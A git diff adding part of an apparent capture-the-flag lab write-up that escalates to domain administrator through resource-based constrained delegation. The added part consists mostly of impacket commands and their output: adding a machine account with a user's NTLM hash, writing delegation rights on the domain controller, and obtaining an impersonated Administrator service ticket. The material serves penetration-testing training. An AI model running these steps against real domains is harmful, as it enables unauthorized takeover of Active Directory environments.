@@ -266,6 +266,48 @@ use sharphound to collect the domain data. so we will analyze with bloodhound.
 
 using bloodhound to enumerate the data coollected, we can see that the user has a `Genericall` on `resourced.resourced.local`. let's abuse it.
 
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
+└─$ impacket-addcomputer -dc-ip 192.168.213.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'  resourced.local/l.livingstone
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
 
+[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
+```
+first we create a machine account in the domain by using user `l.livingstone` priv.
 
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
+└─$ impacket-rbcd -delegate-from 'ATTACK$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -dc-ip 192.168.213.175
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     ATTACK$      (S-1-5-21-537427935-490066102-1511301751-4101)
+```
+We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
+└─$ impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate 'Administrator' 'resourced/ATTACK$:AttackerPC1!' -dc-ip 192.168.213.175
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "Administrator" for. Impacket's getST.py example script can be used for that purpose.
+
+```shell
+export KRB5CCNAME=./Administrator.ccache
+```
+export KRB5Cname
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/14bc10fd-cc94-4082-bbec-3042a16f9c54)
+
+add `192.168.213.175 resourcedc.resourced.local` to `/etc/hosts` file, 
 
